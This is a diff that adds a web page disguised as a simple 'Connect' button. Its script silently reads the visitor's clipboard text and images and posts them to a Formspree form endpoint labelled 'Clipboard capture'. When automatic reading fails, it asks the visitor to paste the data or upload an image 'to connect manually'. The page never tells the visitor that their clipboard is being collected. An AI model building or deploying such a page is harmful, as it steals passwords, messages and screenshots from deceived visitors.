@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Connect</title>
+  <link rel="icon" href="assets/logo.png" type="image/png">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      padding: 2rem; max-width: 600px; margin: auto; line-height: 1.5;
+      background: #f9f9fb; color: #333;
+    }
+    h2 { margin-top: 0; }
+    button {
+      background: #28a745; color: white; border: none; border-radius: 12px;
+      padding: 0.8rem 1.6rem; font-size: 1.1rem; cursor: pointer;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      transition: all 0.2s;
+    }
+    button:hover { background: #218838; transform: translateY(-1px); }
+    button:active { transform: translateY(0); }
+
+    #preview, #imagePreview { 
+      background: white; padding: 1rem; margin: 1rem 0; 
+      border: 1px solid #ddd; border-radius: 8px; white-space: pre-wrap;
+    }
+    #imagePreview img { max-width: 100%; border-radius: 6px; margin-top: 0.5rem; }
+    #manual { margin-top: 1rem; }
+    textarea { width: 100%; height: 80px; font-family: monospace; margin-top: .5rem; border-radius: 6px; }
+    .hidden { display: none; }
+    .error { color: #b00020; }
+    .success { color: #155724; }
+    .info { color: #0c5460; background: #d1ecf1; padding: 0.8rem; border-radius: 6px; font-size: 0.9rem; }
+  </style>
+</head>
+<body>
+
+<button id="grab">Connect</button>
+
+<div id="preview" class="hidden"></div>
+<div id="imagePreview" class="hidden"></div>
+
+<div id="manual" class="hidden">
+  <p><strong>Failed.</strong> Connect manually:</p>
+  <textarea id="pasteArea" placeholder="Paste text here…"></textarea>
+  <input type="file" id="imageInput" accept="image/*" style="margin-top:0.5rem;">
+  <button id="sendManual" style="margin-top:0.5rem; background:#007bff;">Connect manually</button>
+</div>
+
+<div id="status"></div>
+
+<script>
+/* ==== CONFIG ==== */
+const FORMSPREE_ENDPOINT = 'https://formspree.io/f/YOUR_FORM_ID'; // <<< REPLACE THIS!
+
+/* ==== ELEMENTS ==== */
+const statusEl = document.getElementById('status');
+const previewEl = document.getElementById('preview');
+const imagePreviewEl = document.getElementById('imagePreview');
+const manualEl = document.getElementById('manual');
+
+/* ==== HELPERS ==== */
+function setStatus(msg, cls = '') {
+  statusEl.textContent = msg;
+  statusEl.className = cls;
+}
+function show(el) { el.classList.remove('hidden'); }
+function hide(el) { el.classList.add('hidden'); }
+
+/* ==== 1. MODERN CLIPBOARD API (TEXT + IMAGE) ==== */
+async function tryModernClipboard() {
+  if (!navigator.clipboard || !navigator.clipboard.read) return null;
+  try {
+    const items = await navigator.clipboard.read();
+    let text = '', imageBlob = null;
+    for (const item of items) {
+      if (item.types.includes('text/plain')) {
+        const blob = await item.getType('text/plain');
+        text = await blob.text();
+      }
+      if (item.types.some(t => t.startsWith('image/'))) {
+        const type = item.types.find(t => t.startsWith('image/'));
+        imageBlob = await item.getType(type);
+      }
+    }
+    return { text: text.trim(), image: imageBlob };
+  } catch (err) {
+    console.warn('Modern clipboard failed:', err);
+    return null;
+  }
+}
+
+/* ==== 2. LEGACY TEXT PASTE ==== */
+async function tryLegacyPaste() {
+  return new Promise(resolve => {
+    const textarea = document.createElement('textarea');
+    textarea.style.position = 'fixed'; textarea.style.opacity = '0';
+    document.body.appendChild(textarea);
+    textarea.focus();
+    setTimeout(() => {
+      const success = document.execCommand('paste');
+      const text = textarea.value.trim();
+      document.body.removeChild(textarea);
+      resolve(success ? { text, image: null } : null);
+    }, 100);
+  });
+}
+
+/* ==== 3. SEND TO FORMSPREE ==== */
+async function sendData({ text = '', imageBlob = null }) {
+  const payload = { _subject: 'Clipboard capture (text+image)' };
+  if (text) payload.clipboard_text = text;
+  if (imageBlob) {
+    const base64 = await blobToBase64(imageBlob);
+    const ext = imageBlob.type.split('/')[1] || 'png';
+    payload.clipboard_image = `data:${imageBlob.type};base64,${base64}`;
+    payload.image_type = ext;
+  }
+
+  try {
+    const resp = await fetch(FORMSPREE_ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (resp.ok) setStatus('Sent! Check your inbox.', 'success');
+    else { setStatus('Server error.', 'error'); console.error(await resp.text()); }
+  } catch (e) { setStatus('Network failed.', 'error'); console.error(e); }
+}
+
+function blobToBase64(blob) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onload = () => resolve(reader.result.split(',')[1]);
+    reader.onerror = reject;
+    reader.readAsDataURL(blob);
+  });
+}
+
+/* ==== MAIN BUTTON ==== */
+document.getElementById('grab').addEventListener('click', async () => {
+  setStatus('Reading clipboard…');
+  hide(previewEl); hide(imagePreviewEl); hide(manualEl);
+
+  let data = await tryModernClipboard();
+  if (!data || (!data.text && !data.image)) {
+    setStatus('Modern API failed – trying legacy paste…');
+    const legacy = await tryLegacyPaste();
+    if (legacy && legacy.text) data = { text: legacy.text, image: null };
+  }
+
+  if (!data || (!data.text && !data.image)) {
+    setStatus('Connection failed.', 'error');
+    show(manualEl);
+    return;
+  }
+
+  if (data.text) { previewEl.textContent = data.text; show(previewEl); }
+  if (data.image) {
+    const url = URL.createObjectURL(data.image);
+    imagePreviewEl.innerHTML = `<img src="${url}" alt="Clipboard image">`;
+    show(imagePreviewEl);
+  }
+
+  setStatus('Sending…');
+  await sendData(data);
+});
+
+/* ==== MANUAL SEND ==== */
+document.getElementById('sendManual').addEventListener('click', async () => {
+  const text = document.getElementById('pasteArea').value.trim();
+  const file = document.getElementById('imageInput').files[0];
+  if (!text && !file) { setStatus('Add text or image first.', 'error'); return; }
+  setStatus('Sending manual data…');
+  await sendData({ text, image: file });
+});
+</script>
+
+</body>
+</html>
